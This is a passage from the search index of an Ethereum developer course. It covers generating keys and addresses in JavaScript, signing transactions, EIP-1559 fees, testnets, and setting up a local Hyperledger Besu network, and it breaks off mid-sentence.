JavaScript"},{"location":"S02-ethereum/M2-accounts/L2-generating-accounts/#generate-private-key","text":"First, we are going to generate a private key, derive public keys from the private key and determine the associated accounts. To get started clone the project and run: $ npm install $ npm run watch # this will watch for updates in main.js and update bundle.js` $ npm run reload # this will serve the app @ localhost:8081 and refresh the page when there are updates (If you run into any problems while implementing this demo application, try opening the developer tools in the browser (Ctrl + Shift + I or F12) and checking the \"Console\" tab.) In the main.js file include the bip39 package . We will use this to generate random input to generate a private key. const BIP39 = require(\"bip39\") and directly below that include: // Generate a random mnemonic ( uses crypto . randomBytes under the hood ) , defaults to 128 - bits of entropy function generateMnemonic () { return BIP39 . generateMnemonic () } Note: Not all strings of characters are valid mneomics for generating keys. You can check if a mnemonic is valid by running: var isValid = BIP39 . validateMnemonic ( \"Enter your mnemonic here\" ) // This will return false because \"Enter your mneomnic here\" is not a valid phrase With this mnemonic, you can generate a seed from which to generate a private key. Add the following line to main.js : function generateSeed ( mnemonic ) { return BIP39 . mnemonicToSeed ( mnemonic ) }","title":"Generate Private Key"},{"location":"S02-ethereum/M2-accounts/L2-generating-accounts/#generate-a-public-private-keypair","text":"Using this mnemonic as a source of randomness, you can now create signing keypair. To generate a private key from the hex seed, we will to use the ethereumjs-wallet library const hdkey = require ( \"ethereumjs-wallet/hdkey\" ) Explore a much more robust address derivation application at iancoleman.io function generatePrivKey ( mnemonic ){ const seed = generateSeed ( mnemonic ) return hdkey . fromMasterSeed ( seed ) . derivePath ( ` m / 44 '/60' / 0 '/0/0`).getWallet().getPrivateKey() } With the private key, we can generate the public key. Import the ethereumjs wallet and derive the public key const Wallet = require ( 'ethereumjs-wallet' ) ... function derivePubKey ( privKey ){ const wallet = Wallet . fromPrivateKey ( privKey ) return wallet . getPublicKey () } Generating the private key and public key is the same for both Bitcoin and Ethereum as both use secp256k1 elliptic curve cryptography . Deriving an account address from the public key differs slightly.","title":"Generate a Public / Private Keypair"},{"location":"S02-ethereum/M2-accounts/L2-generating-accounts/#derive-the-ethereum-address-from-the-keypair","text":"Deriving an Ethereum address from a public key requires an additional hashing algorithm. Import it like so: const keccak256 = require ( 'js-sha3' ) . keccak256 ; Taking the keccak-256 hash of the public key will return 32 bytes which you need to trim down to the last 20 bytes (40 characters in hex) to get the address function deriveEthAddress ( pubKey ){ const address = keccak256 ( pubKey ) // keccak256 hash of publicKey // Get the last 20 bytes of the public key return \"0x\" + address . substring ( address . length - 40 , address . length ) } You can check this mnemonic, private key and address against myetherwallet . Select restore from mnemonic or private key and verify that the derived address matches the one in this app.","title":"Derive the Ethereum Address From the Keypair"},{"location":"S02-ethereum/M2-accounts/L2-generating-accounts/#creating-a-digital-signature-with-your-key","text":"Using this private key we can sign transactions from this address and broadcast them to the network. Nodes that are verifying transactions in the network will use the signature to determine the address of the signatory, cryptographically verifying that every transaction from this account is coming from someone who has access to the corresponding private key. You can sign transactions in the browser with the ethereumjs-tx library . const EthereumTx = require ( 'ethereumjs-tx' ) ... function signTx ( privKey , txData ){ const tx = new EthereumTx ( txData ) tx . sign ( privKey ) return tx } Unsigned Ethereum transactions look something like this: { nonce: '0x00', gasPrice: '0x09184e72a000', gasLimit: '0x2710', to: '0x31c1c0fec59ceb9cbe6ec474c31c1dc5b66555b6', value: '0x10', data: '0x7f7465737432000000000000000000000000000000000000000000000000000000600057', chainId: 3 } And a signed transaction looks something like this: { nonce: '0x00', gasPrice: '0x09184e72a000', gasLimit: '0x2710', to: '0x31c1c0fec59ceb9cbe6ec474c31c1dc5b66555b6', value: '0x00', data: '0x7f7465737432000000000000000000000000000000000000000000000000000000600057', v: '0x29', r: '0xb934fbdb16fda944ddc0cb33e64344b90fbd25564444832f7f8d697512069402', s: '0x29' } Notice the main difference is the inclusion of the variables v , r and s . These variables are used to recover the address corresponding to the key that signed the transaction. This signed transaction is broadcast to the network to be included in a block. You can read more about these variables in this excellent article here. You can recover the sender address from the signed transaction with the following method: function getSignerAddress ( signedTx ) { return \"0x\" + signedTx . getSenderAddress () . toString ( 'hex' ) } That's it! You've successfully generated a private, public keypair and then used that to derive a valid Ethereum address. You've also then created the world's tiniest crypto-wallet using signTx() function and seen how you can recover the address from a digital signature or signed transaction. You'll very rarely have to do this kind of crypto-primitive handling. For one, it's garbage for security. But, also, there is so much tooling available to you to do these kind of operations safely and efficiently at scale. For learning purposes, however, nothing beats coding this stuff on its own!","title":"Creating a Digital Signature With Your Key"},{"location":"S02-ethereum/M2-accounts/L2-generating-accounts/#additional-links","text":"Understanding the concept of private keys, public keys and addresses in Ethereum Bitcoin wiki on Secp256k1 Ethereum yellow paper Article: The Magic of Digital Signatures (MyCrypto)","title":"Additional links:"},{"location":"S02-ethereum/M2-accounts/L3-nodes/","text":"Currently on LMS This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S02-ethereum/M2-accounts/L3-nodes/#currently-on-lms","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Currently on LMS"},{"location":"S02-ethereum/M3-state/L1-txns/","text":"Transactions This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S02-ethereum/M3-state/L1-txns/#transactions","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Transactions"},{"location":"S02-ethereum/M3-state/L2-gas-and-fees/","text":"Gas and Fees This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S02-ethereum/M3-state/L2-gas-and-fees/#gas-and-fees","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Gas and Fees"},{"location":"S02-ethereum/M3-state/L3-eth-structure/","text":"Ethereum Structure This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S02-ethereum/M3-state/L3-eth-structure/#ethereum-structure","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Ethereum Structure"},{"location":"S02-ethereum/M3-state/L4-txn-tutorial/","text":"Sending Transactions We're created an interactive Observable notebook to learn more about Externally Owned Accounts signing and sending transactions into the network. You can find the tutorial here. If the notebook doesn't operate properly or you get the error Web3js = SecurityError: Failed to read the 'localStorage' property from 'Window': Access is denied for this document. you will need to enable third party cookies. This varies from browser to browser.","title":"Index"},{"location":"S02-ethereum/M3-state/L4-txn-tutorial/#sending-transactions","text":"We're created an interactive Observable notebook to learn more about Externally Owned Accounts signing and sending transactions into the network. You can find the tutorial here. If the notebook doesn't operate properly or you get the error Web3js = SecurityError: Failed to read the 'localStorage' property from 'Window': Access is denied for this document. you will need to enable third party cookies. This varies from browser to browser.","title":"Sending Transactions"},{"location":"S02-ethereum/M3-state/L5-merkle-trees/","text":"Ethereum Networks We've talked already about the different configurations a blockchain network can have to put it in one of three general categories: Public, Private or Consortium. We wanted to briefly touch on some of the Ethereum networks that exist. Public Mainnet, Public Testnets When people think of the Ethereum network, most likely they are thinking about the Public Mainnet Ethereum network. This is the primary blockchain network for Ethereum, contains real-world value, and is dictated by current stable version of the Ethereum client software (more on Ethereum clients next section). Ethereum also has testnets, these are typically run by a small number of developers for development purposes but open to the public. Each of these testnets has their own base currency they use, like ETH for Mainnet. Ether used on testnets is called \"test eth.\" Here is the list of Ethereum public testnets as of August 2021: * Goerli (sometimes spelled G\u00f6rli) Proof of Authority testnet that was launched primarily to help launch the Beacon chain as part of Ethereum's transition to Proof of Stake. * Kovan \"A proof-of-authority testnet for those running OpenEthereum clients.\" ( source ) * Rinkeby A Proof of Authority testnet based on the Go-Ethereum (Geth) client. It can be surprisingly hard to find Rinkeby test ETH for some reason. * Ropsten A Proof of Work based testnet. As we'll discuss later, you can also spin up a private testnet locally using Ganache or other developer tools. Additional Material Wiki: Ethereum Networks (Ethereum.org)","title":"Index"},{"location":"S02-ethereum/M3-state/L5-merkle-trees/#ethereum-networks","text":"We've talked already about the different configurations a blockchain network can have to put it in one of three general categories: Public, Private or Consortium. We wanted to briefly touch on some of the Ethereum networks that exist.","title":"Ethereum Networks"},{"location":"S02-ethereum/M3-state/L5-merkle-trees/#public-mainnet-public-testnets","text":"When people think of the Ethereum network, most likely they are thinking about the Public Mainnet Ethereum network. This is the primary blockchain network for Ethereum, contains real-world value, and is dictated by current stable version of the Ethereum client software (more on Ethereum clients next section). Ethereum also has testnets, these are typically run by a small number of developers for development purposes but open to the public. Each of these testnets has their own base currency they use, like ETH for Mainnet. Ether used on testnets is called \"test eth.\" Here is the list of Ethereum public testnets as of August 2021: * Goerli (sometimes spelled G\u00f6rli) Proof of Authority testnet that was launched primarily to help launch the Beacon chain as part of Ethereum's transition to Proof of Stake. * Kovan \"A proof-of-authority testnet for those running OpenEthereum clients.\" ( source ) * Rinkeby A Proof of Authority testnet based on the Go-Ethereum (Geth) client. It can be surprisingly hard to find Rinkeby test ETH for some reason. * Ropsten A Proof of Work based testnet. As we'll discuss later, you can also spin up a private testnet locally using Ganache or other developer tools.","title":"Public Mainnet, Public Testnets"},{"location":"S02-ethereum/M3-state/L5-merkle-trees/#additional-material","text":"Wiki: Ethereum Networks (Ethereum.org)","title":"Additional Material"},{"location":"S02-ethereum/M3-state/L6-playing-with-merkle-trees/","text":"Playing with Merkle Trees To learn more about Merkle Trees, we've made an Observable Notebook you can find here. Follow along with the tutorial to better understand the code structure of this data structure. Additional Material Video: Merkle Roots, Merkle Trees Wikipedia: Merkle Trees, Merkle Patricia Tree, Radix Tree Interactive Code: Binary Trees Scroll down to \"Binary Search Tree,\" this is more general computer science! Code Tutorial: Implement A Binary Search Tree Again, another general computer science tutorial, simply meant to give you an understanding of tree data structures and how machines read and write to them.","title":"Index"},{"location":"S02-ethereum/M3-state/L6-playing-with-merkle-trees/#playing-with-merkle-trees","text":"To learn more about Merkle Trees, we've made an Observable Notebook you can find here. Follow along with the tutorial to better understand the code structure of this data structure.","title":"Playing with Merkle Trees"},{"location":"S02-ethereum/M3-state/L6-playing-with-merkle-trees/#additional-material","text":"Video: Merkle Roots, Merkle Trees Wikipedia: Merkle Trees, Merkle Patricia Tree, Radix Tree Interactive Code: Binary Trees Scroll down to \"Binary Search Tree,\" this is more general computer science! Code Tutorial: Implement A Binary Search Tree Again, another general computer science tutorial, simply meant to give you an understanding of tree data structures and how machines read and write to them.","title":"Additional Material"},{"location":"S02-ethereum/M3-state/L7-1559/","text":"EIP-1559 We've talked about mining in the Ethereum as the way the network confirms and propagates state changes. However, in August 2021, the Ethereum core developer community, after many years of research, development and testing, released a major change to the mining process in Ethereum known as EIP-1559 (remember Ethereum Improvement Proposals or EIPs are the way the Ethereum community incorporates changes to the protocol). Before EIP-1559, Ethereum transaction fees were market-driven. Meaning, the gas price, or fee, dictated how quickly a miner would include a transaction in a block. This has led to some dramatic price swings in fees and pushed network developers to find a more stable solution. Enter EIP-1559. EIP-1559 replaces the gas fees with a fixed-price sale. Now, people submitting transactions won\u2019t have to guess as much about how much gas is required, as there will be an explicitly \u2018base fee\u2019 to be included in the next block. For users or applications that want to prioritize their transaction, they can add a \u201ctip\u201d to pay a miner. The base fee will be \"burned,\" meaning destroyed, while the tip goes to the miner. In times of high network activity, the base fee will adjust in a predictable manner to gate the flow of transactions. As an analogy to explain the base fee and tip, imagine the experience of using a ride sharing service app on your phone (e.g. Uber, Lyft, or Didi). You want to use this app to get a ride to go from A to B. The cost to go from A to B is the same, regardless of which driver picks you up (the base fee in EIP-1559). Now, imagine if you were able to add a tip to your driver, prior to getting on the ride. If your tip is higher than what other people at that time are offering, drivers will be incentivized to pick you up over other potential passengers not offering a tip. This process is similar to your ETH transactions: you can set a tip for miners (the \u201cdriver\u201d in the above example) to include your transaction in the next block (the \u201cride\u201d in the above example). A higher tip means a greater chance of your transaction being included in the next block and therefore being completed. Crucially, EIP-1559 makes the gas prices more transparent but it does not lower the prices. This is a common misconception. EIP-1559 may reduce the amount of time the network has high gas prices, but the only way to deal with high gas prices is to improve scalability (which we'll discuss in a later section). It's still very early days for 1559 and we'll get to see how it progresses together! Changes for Developers EIP-1559 is a backwards compatible upgrade. You'll remember from the section on distributed consensus, this means that pre-EIP-1559 transaction structure is still supported. However, post-EIP-1559, a transaction price is calculated using the following equation: transaction fee = baseFee + min(maxFee - baseFee, priorityFee) An explanation of the three variables: * baseFee A fee that floats based on the network congestion and the most recent value can be fetched via a new JSON RPC call eth_feeHistory * priorityFee (also called a tip) A fee to entice a block producer to include the transaction. * maxFee The highest network fee the user is willing to pay. Here are some changes to the Ethereum JSON-RPC format you will see on the protocol level that may affect the way you develop as well, broken down by part of the Ethereum protocol affected: Blocks eth_getBlockBy A new field baseFeePerGas is included for post-London blocks eth_getUncleBy* A new field baseFeePerGas is included for post-London blocks Block header data baseFeePerGas is the base fee paid by all transactions in this block. (The field is empty for all blocks before the fork.) Transaction Data maxPriorityFeePerGas specifies the tip (priority fee) to entice a block producer to include your transaction. maxFeePerGas is the maximum fee the user is willing to pay the block producer for including this transaction. Legacy transactions that only include a gasPrice are still valid and they will be accepted into the blocks. The user will simply pay the entire proposed network fee and as a result they may pay a premium compared to other users on the network. eth_gasPrice is deprecated and replaced with eth_feeHistory , which returns transaction fee data for up to 1024 blocks. For each block, eth_feeHistory reports the base fee, a percentile list of effective priority fees and the ratio of gas used/limit. Note the required base fee for the next block is returned as well. Transaction Simulation eth_call May require the developer to specify the gas price or new 1559 gas pricing to reflect true execution of a transaction. The Go-Ethereum (geth) developer team has more about the changes to eth_call here. eth_estimateGas May fail to estimate the gas if the gas price or new 1559 gas pricing is not filled in (i.e., greater than 0). London Fork, which implements EIP-1559, also implements the related EIP-3198. This adds a new opcode, BASEFEE , that returns the base fee of the current block it is executing in. It is recommended for developers to explicitly set the gas pricing for both JSON RPC calls to avoid a failed JSON RPC call response. Additional Material Video: EIP-1559 Explained (Finematics) Article: What is EIP-1559? (ConsenSys) A great introductory explainer article we used for much of the course material. Article: What is EIP-1559? (MetaMask) Another introductory article, this time from the perspective of a MetaMask user Video: How To Set Transaction Priority in MetaMask Great video walking through the ways in which MetaMask is adjusting to EIP-1559. Interactive: Ultrasound Money The website provides realtime updates on how much ether has been burned as part of EIP-1559 ### Technical Article: London Fork (Infura) Great technical overview of the protocol changes coming to clients, specifically to the JSON-RPC API calls all Ethereum clients must use. Article: EIP-1559 JSON-RPC Changes (Tim Beiko) A more dry look at the JSON-RPC changes Wiki: 1559 Resources (Tim Beiko) A comprehensive list of resources to explore any aspect of EIP-1559, from the UX, Security, Economics, Mining or Simulations GitHub: eth_call invocations post 1559 Explainer from the Geth team about the changes to the eth_call JSON-RPC call","title":"Index"},{"location":"S02-ethereum/M3-state/L7-1559/#eip-1559","text":"We've talked about mining in the Ethereum as the way the network confirms and propagates state changes. However, in August 2021, the Ethereum core developer community, after many years of research, development and testing, released a major change to the mining process in Ethereum known as EIP-1559 (remember Ethereum Improvement Proposals or EIPs are the way the Ethereum community incorporates changes to the protocol). Before EIP-1559, Ethereum transaction fees were market-driven. Meaning, the gas price, or fee, dictated how quickly a miner would include a transaction in a block. This has led to some dramatic price swings in fees and pushed network developers to find a more stable solution. Enter EIP-1559. EIP-1559 replaces the gas fees with a fixed-price sale. Now, people submitting transactions won\u2019t have to guess as much about how much gas is required, as there will be an explicitly \u2018base fee\u2019 to be included in the next block. For users or applications that want to prioritize their transaction, they can add a \u201ctip\u201d to pay a miner. The base fee will be \"burned,\" meaning destroyed, while the tip goes to the miner. In times of high network activity, the base fee will adjust in a predictable manner to gate the flow of transactions. As an analogy to explain the base fee and tip, imagine the experience of using a ride sharing service app on your phone (e.g. Uber, Lyft, or Didi). You want to use this app to get a ride to go from A to B. The cost to go from A to B is the same, regardless of which driver picks you up (the base fee in EIP-1559). Now, imagine if you were able to add a tip to your driver, prior to getting on the ride. If your tip is higher than what other people at that time are offering, drivers will be incentivized to pick you up over other potential passengers not offering a tip. This process is similar to your ETH transactions: you can set a tip for miners (the \u201cdriver\u201d in the above example) to include your transaction in the next block (the \u201cride\u201d in the above example). A higher tip means a greater chance of your transaction being included in the next block and therefore being completed. Crucially, EIP-1559 makes the gas prices more transparent but it does not lower the prices. This is a common misconception. EIP-1559 may reduce the amount of time the network has high gas prices, but the only way to deal with high gas prices is to improve scalability (which we'll discuss in a later section). It's still very early days for 1559 and we'll get to see how it progresses together!","title":"EIP-1559"},{"location":"S02-ethereum/M3-state/L7-1559/#changes-for-developers","text":"EIP-1559 is a backwards compatible upgrade. You'll remember from the section on distributed consensus, this means that pre-EIP-1559 transaction structure is still supported. However, post-EIP-1559, a transaction price is calculated using the following equation: transaction fee = baseFee + min(maxFee - baseFee, priorityFee) An explanation of the three variables: * baseFee A fee that floats based on the network congestion and the most recent value can be fetched via a new JSON RPC call eth_feeHistory * priorityFee (also called a tip) A fee to entice a block producer to include the transaction. * maxFee The highest network fee the user is willing to pay. Here are some changes to the Ethereum JSON-RPC format you will see on the protocol level that may affect the way you develop as well, broken down by part of the Ethereum protocol affected:","title":"Changes for Developers"},{"location":"S02-ethereum/M3-state/L7-1559/#blocks","text":"eth_getBlockBy A new field baseFeePerGas is included for post-London blocks eth_getUncleBy* A new field baseFeePerGas is included for post-London blocks Block header data baseFeePerGas is the base fee paid by all transactions in this block. (The field is empty for all blocks before the fork.)","title":"Blocks"},{"location":"S02-ethereum/M3-state/L7-1559/#transaction-data","text":"maxPriorityFeePerGas specifies the tip (priority fee) to entice a block producer to include your transaction. maxFeePerGas is the maximum fee the user is willing to pay the block producer for including this transaction. Legacy transactions that only include a gasPrice are still valid and they will be accepted into the blocks. The user will simply pay the entire proposed network fee and as a result they may pay a premium compared to other users on the network. eth_gasPrice is deprecated and replaced with eth_feeHistory , which returns transaction fee data for up to 1024 blocks. For each block, eth_feeHistory reports the base fee, a percentile list of effective priority fees and the ratio of gas used/limit. Note the required base fee for the next block is returned as well.","title":"Transaction Data"},{"location":"S02-ethereum/M3-state/L7-1559/#transaction-simulation","text":"eth_call May require the developer to specify the gas price or new 1559 gas pricing to reflect true execution of a transaction. The Go-Ethereum (geth) developer team has more about the changes to eth_call here. eth_estimateGas May fail to estimate the gas if the gas price or new 1559 gas pricing is not filled in (i.e., greater than 0). London Fork, which implements EIP-1559, also implements the related EIP-3198. This adds a new opcode, BASEFEE , that returns the base fee of the current block it is executing in. It is recommended for developers to explicitly set the gas pricing for both JSON RPC calls to avoid a failed JSON RPC call response.","title":"Transaction Simulation"},{"location":"S02-ethereum/M3-state/L7-1559/#additional-material","text":"Video: EIP-1559 Explained (Finematics) Article: What is EIP-1559? (ConsenSys) A great introductory explainer article we used for much of the course material. Article: What is EIP-1559? (MetaMask) Another introductory article, this time from the perspective of a MetaMask user Video: How To Set Transaction Priority in MetaMask Great video walking through the ways in which MetaMask is adjusting to EIP-1559. Interactive: Ultrasound Money The website provides realtime updates on how much ether has been burned as part of EIP-1559 ### Technical Article: London Fork (Infura) Great technical overview of the protocol changes coming to clients, specifically to the JSON-RPC API calls all Ethereum clients must use. Article: EIP-1559 JSON-RPC Changes (Tim Beiko) A more dry look at the JSON-RPC changes Wiki: 1559 Resources (Tim Beiko) A comprehensive list of resources to explore any aspect of EIP-1559, from the UX, Security, Economics, Mining or Simulations GitHub: eth_call invocations post 1559 Explainer from the Geth team about the changes to the eth_call JSON-RPC call","title":"Additional Material"},{"location":"S02-ethereum/M3-state/L8-networks/","text":"Merkel Trees This content is a video hosted on courses.consensys.net (for now)","title":"Index"},{"location":"S02-ethereum/M3-state/L8-networks/#merkel-trees","text":"This content is a video hosted on courses.consensys.net (for now)","title":"Merkel Trees"},{"location":"S02-ethereum/M4-clients-workshop/L1/","text":"What is an Ethereum Client? Running Hyperledger Besu Hyperledger Besu is an Ethereum client with mainnet compatibility. It can also be used to run a private network. It is the open-source protocol layer that delivers all the perks from Ethereum and addresses enterprise requirements. Hyperledger Besu is actually part of a bundled suite of Ethereum protocol clients called ConsenSys Quorum, which consists of Hyperledger Besu and GoQuorum, private key managers, consensus mechanisms, transaction managers, APIs, plugins, libraries, deployment tools, etc. In this tutorial, we are going to walk you through how the client works, and take some detours to explain concepts in detail. Let\u2019s get started At the end of this guide, we will have walked you through deploying the Hyperledger Besu via the ConsenSys Quorum quickstart AND learned generally about private and public networks. As part of this process you will: Part 1: Download all necessary dependencies required of your system to run the ConsenSys Quorum Quickstart Part 2: Download and Start the ConsenSys Quorum Quickstart Part 3: Set up MetaMask and import a private key from the README Part 4: Deploy a decentralized application to the private network Part 5: Use the monitoring tools used in the quickstart Part 6: Deploy a second Smart Contract to the network and send a private transaction We will walk you through every step of the process, helping you get setup and providing helpful resources in case you get stuck. We will go into more detail than the documentation, where appropriate, to give you a deeper understanding of Hyperledger Besu We will be referring to the documentation found here throughout this article and linking to other useful documentation if you would like to do deeper into any particular topic. Part 1: Installing Dependencies This section will walk you through the installation of dependencies. This is written for new developers or those unfamiliar with the technology used by Hyperledger Besu. Feel free to move at a pace that meets your needs. MacOS users will start by installing NodeJS. Open up the terminal. If this is the first that you are hearing the term terminal or directory, check out this guide to understanding how the shell, terminal, and directories on a computer will work. This will be important to understanding how to navigate to the appropriate location on your computer. Type in node --version to see if node is already installed on your computer. If it is, you will get the version returned, for example: If node is not installed, you will see command not found: node . Click on this link to go to the Nodejs website and download the MacOS installer (the file name will end in .pkg). Open it up and follow the instructions. Once completed, restart your terminal. Then type node --version into the terminal again to confirm Node has properly installed. If you are having problems with installation of node, you can access the help from the Node community via the \u201chelp\u201d section of their GitHub, which includes links to their Slack channel. MacOS users will now move onto installing Docker and Docker Compose Open up the terminal and type in docker --version to see if Docker is already installed on your computer. If it is, you will get the version returned, for example: If Docker is not installed, you will see command not found: docker . Click on this link to go to Docker website and download Docker Desktop, which will include Docker and Docker Compose. Click the button for the appropriate chip within your Mac (The Apple chip was released in late 2020, if you have a Mac from before then it\u2019s most likely an Intel chip) Follow along with the rest of the instructions in the link provided. For a tutorial on Docker itself, you can find that here, along with another Getting Started Guide here. If you run into issues, access the troubleshooting guide for Docker. Open up Docker on your desktop, and you should see the following: Click on the Gear icon in the upper right corner. Navigate to resources and ensure under the \u201cAdvanced\u201d tab there is at least 6 GB of memory allocated to allow us to run all the examples in this Getting Started guide. Your settings should look like something below: Linux users will need first need to install Docker Engine and then can follow the steps contained within the Docker Compose documentation. After installing Docker, Linux users MUST follow the post-installation steps. Specifically, you need to add the user to the docker group, this step is often overlooked and every docker command will fail if this is not done. Part 2: Installing and Starting the Quorum Quickstart Open up the terminal and type in npx quorum-dev-quickstart and press enter ( npx , as opposed to the command npm , will cut down on pollution on your computer by not installing dependencies) The quickstart will download and we will get the following prompt. For the purposes of this guide, we will use the Hyperledger Besu option - which is 1. We are not trying out Codefi Orchestrate in this demo, so hit \u201cN for the prompt: Do you want to try out Codefi Orchestrate? Note: choosing yes will direct you to a login/registration page. [Y/n] N We do want to enable support for private transactions, so choose Y for the following prompt: Do you wish to enable support for private transactions? [Y/n] Y Do you wish to enable support for logging with ELK (Elasticsearch, Logstash & Kibana)? [y/N] Y This will look like: The default directory that will be created to store these files will be named quorum-test-network , but you can rename the network on this next line: Where should we create the config files for this network? Please choose either an empty directory, or a path to a new directory that does not yet exist. Default: ./quorum-test-network For example, if I wanted to name the directory besu-test-network , I would enter ./besu-test-network and this would create a new directory called besu-test-network . The name of the new directory has to be a directory that does not exist, or else we will get an error. The Quorum Quickstart will be installed on your computer in the directory named quorum-test-network . In the terminal, change directory to the quorum-test-network folder with the command cd quorum-test-network and the list out the sub-directories and files within this folder by typing the command ls to list the contents of quorum-test-network Type in the command less README.md to see the instructions for the quickstart. Hit q to exit out of this view. Alternatively, you can see the READ.ME within the Quorum Dev Quickstart by viewing it within the ConsenSys Quorum GitHub Repository. We are now going to start a private network that will run using Hyperledger Besu as the Ethereum client. This private network will run locally on our computer. Run the command ./run.sh in the terminal. The private network will now begin running. If you run into any issues with starting the Quickstart, use the Hyperledger Besu chat channel to reach out for help. How will we know if we have successfully launched the network? You should see the following (it may take a few minutes for this to load): Congratulations! You\u2019ve spun up a private Ethereum network on your local computer using Hyperledger Besu. Issues you may encounter, and how to resolve them: If you have use Docker and Docker compose previously, particularly with a previous version of this quickstart, it is likely that you could run into an error upon start up: ERROR: Pool overlaps with other one on this address space If you get this error, it means that even though the docker containers are down, the networks may still exist. A longer thread explaining this issue can be found here. A helpful resolution is to open up the command line and run the following command: docker network prune If that does not work, run the following combination of commands docker-compose down docker network prune This will restart the Docker service, and hopefully resolve any overlap conflicts. You can also run run docker ps to check for any overlapping registered containers. Once those are identified, use docker rm to remove the containers that are overlapping. A Brief Discussion of the Consensus Mechanism Let\u2019s quickly discuss the consensus mechanism you are using in your network. As we discussed earlier, the consensus mechanism is the coordinating process that the network uses to confirm, sync, and finalize new blocks on your blockchain. In this section, we are going to explore the two Proof of Authority (PoA) consensus mechanisms that you can use with Hyperledger Besu: Clique and IBFT 2.0. In a private network, we want to avoid using the consensus mechanism that is used on Ethereum mainnet - Ethash Proof of Work (PoW). Why? Ethash works well for Ethereum mainnet because anyone can participate in Ethereum mainnet by running a node and providing computation power to the network. Therefore, this computationally intense consensus mechanism ensures that any participant must compete with the other participants to produce and propagate blocks. The incentive of block rewards serves to ensure they are following the rules of the network. The more computing power that each node brings to the network, the greater benefits to the security of the network when PoW is the consensus mechanism. We are going to assume that you are not using the Ethash Proof of Work (PoW) consensus mechanism that is used for Ethereum mainnet because your network has participants that are: Known to each other, and Have a certain degree of inherent trust in each other. These two assumptions allow for your network to use a consensus mechanism which is more computationally efficient for the participants - they do not have to have the same computing power required of a node on Ethereum mainnet. These assumptions also allow for the removal of the incentive of block rewards to ensure compliance. Using a PoA consensus mechanism gives your network: Faster block creation as compared to a network running Ethash: Your network can create new blocks in a one or two seconds. As a comparison, Ethash on mainnet averages about 15 seconds for creation of a new block. Greater transaction throughput for the network: Without the need to incentivize the participants, the size of each block can be arbitrarily large, allowing for blocks with many transactions included as your network needs them to be included. Large transactions will not significantly or noticeably slow down the network (smaller blocks will be processed faster than larger blocks, the end user should not notice a difference). PoA assumes that the creators of the blocks - which are sometimes called minters, signers, sealers, or validators (we will refer to nodes on a PoA network as validators from here on) - are authorized to be validators. At the creation of the PoA network we declare a group (or \u201cpool\u201d) of validators, and as the network runs, those starting validators can add and/or subtract other validators. A short explanation of PoA To understand PoA, it helps to specifically discuss the consensus mechanism Clique PoA, as it was designed to approximate Ethereum mainnet for use in Ethereum testnets. The Ropsten testnet used PoW, but was plagued by attackers forcing reorgs and forks in the testnet and increasing the block gas limit and sending large transactions, which effectively stopped the network. A new consensus mechanism was designed by P\u00e9ter Szil\u00e1gyi called Clique, which could replace PoW on networks like testnets. Clique PoA was designed to use the existing Ethereum block data structure to add voting functionality. Generally in any PoA consensus mechanism, validators alternate adding blocks to the blockchain in a series. In addition to adding blocks, they can choose to vote to add or kick out a validator. This allows malicious validators to be removed from the network, and trusted validators to be added. This gives PoA resistance against certain kinds of attack vectors like: A malicious validator - if a machine is compromised, and a validator proposes incorrect blocks, they can be voted out by the other validators A censoring validator - if a compromised validator proposes votes to remove good actors, they can be removed by being voted out A spamming validator - if a validator makes a voting proposal in every block that the validator creates, the network is spammed by having to consistently tally the votes (votes being to add or remove a validator). By resetting voting after a set period of time (this period of time is referred to as an epoch and is set to be 30,000 blocks in our tutorials), this problem can be mitigated. Concurrent block creation by a validator can also be prevented by ensuring there is a substantial enough lag between each block being added to the blockchain. In short, many of the features of mainnet Ethereum can be approximated, but without needing to use PoW and the challenges that using PoW on a private or test blockchain would entail. Clique PoA Compared to IBFT 2.0 PoA Now that we know a bit more about PoA, we\u2019ll compare Clique PoA with IBFT 2.0 PoA in regards to: Finality - the amount of time required to guarantee a block has been added to the blockchain. Validators required - the minimum amount of validator nodes that have to participate in the network in order for the PoA consensus mechanism to work as intended. Liveness - the number of validator nodes that must be online or \u201clive\u201d to allow the network to continue running. This can also be thought of as a kind of fault tolerance - the number of validators that can fail at a given point in time and the network will still run. Relative Speed of Block Creation - how long it takes for each PoA consensus mechanism to create and sync new blocks and the factors that impact the speed of block creation. Finality Instantaneous finality is possible when only one block can be added at a point in time to the blockchain. If there is a possibility that multiple blocks are proposed at the same time, then a fork or reorganization can occur, and the validators are forced to make a choice about which block is a part of the final chain. In Clique PoA, a block will not be guaranteed to be added to the chain upon creation because there is a possibility of two blocks being proposed at the same time if a validator proposes a block out of turn. Blocks proposed simultaneously cause a fork in the network, as there are now two possible blocks for the next validator to create a block subsequent to (the second signer is prevented from signing subsequent blocks by the consensus mechanism). Because there are now two possible chains that could be built, the network must reorganize (or reorg), choosing which chain to build on. Due to this possibility, finality can be delayed when using Clique PoA if validators create blocks out of turn, and a block is not definitively confirmed upon creation. IBFT 2.0 has immediate finality, provided there are four validators. Once a block is created it becomes part of the blockchain. There are no forks. Validators Required Clique can run with a single validator (the use case for a single validator is purely demonstration purposes). As the number of validators in a Clique network increases, the probability of forks in the network increases. IBFT 2.0 requires four validators to be byzantine fault tolerant. Three or less validators running on an IBFT 2.0 network will no longer guarantee immediate finality or prevent network manipulation, particularly if one or more of the validators is acting in an adversarial nature. Liveness Clique can operate with half of the validators running (half of the validators can go down and the network will still work). IBFT 2.0 can operate as long as at least \u2154 of the validators are working. As noted in the validators required section, three or less validators running on an IBFT 2.0 network will no longer guarantee immediate finality, particularly if one or more of the validators is acting in an adversarial nature. Speed Clique is faster than IBFT 2.0 at adding blocks. IBFT 2.0 is slower at adding blocks. As more validators are added the time to add new blocks increases. Specific Examples Guitar Manufacturing A custom guitar manufacturer wants to create transparency for their customers to show the woods they are using in building custom guitars. They source woods locally and use reclaimed woods from the city they are based in. They want to write a transaction to a blockchain so that a customer can scan a QR code and see each transaction associated with the various woods used in the guitars. They work directly with two wood suppliers, and with an additional individual who helps them with salvage work to get reclaimed wood from old buildings. Looking at this case, we see the following: There is anywhere from a single to maybe four participants to start (the two wood suppliers and the reclaimed wood supplier) This is a project to provide transparency to the end-user, so transactions can be sent as needed, with addresses being created to represent specific 